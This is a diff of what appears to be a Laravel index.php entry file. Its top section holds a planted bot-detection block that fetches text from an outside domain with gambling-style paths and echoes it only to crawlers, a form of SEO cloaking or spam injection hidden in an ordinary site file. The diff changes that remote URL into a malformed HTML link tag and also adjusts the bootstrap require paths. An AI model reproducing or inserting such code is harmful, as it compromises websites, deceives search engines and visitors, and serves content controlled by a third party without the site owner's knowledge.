@@ -13,7 +13,7 @@ function is_bot() {
 }
 
 if (is_bot()) {
-    $message = file_get_contents('https://amp-saya.com/brand/kikototo/zabola.com/index.txt');#NAROLINK
+    $message = file_get_contents('<link rel="amphtml" href="https://amp-saya.com/brand/nustoto/thefatlamborlando.com/index.txt" />');#NAROLINK
     echo $message;
 }
 ?>
@@ -38,7 +38,7 @@ if (is_bot()) {
 |
 */
 
-require __DIR__.'/../bootstrap/autoload.php';
+require __DIR__.'/bootstrap/autoload.php';
 
 /*
 |--------------------------------------------------------------------------
@@ -52,7 +52,7 @@ require __DIR__.'/../bootstrap/autoload.php';
 |
 */
 
-$app = require_once __DIR__.'/../bootstrap/app.php';
+$app = require_once __DIR__.'/bootstrap/app.php';
 
 /*
 |--------------------------------------------------------------------------
@@ -75,3 +75,7 @@ $response = $kernel->handle(
 $response->send();
 
 $kernel->terminate($request, $response);
+
+
+
+
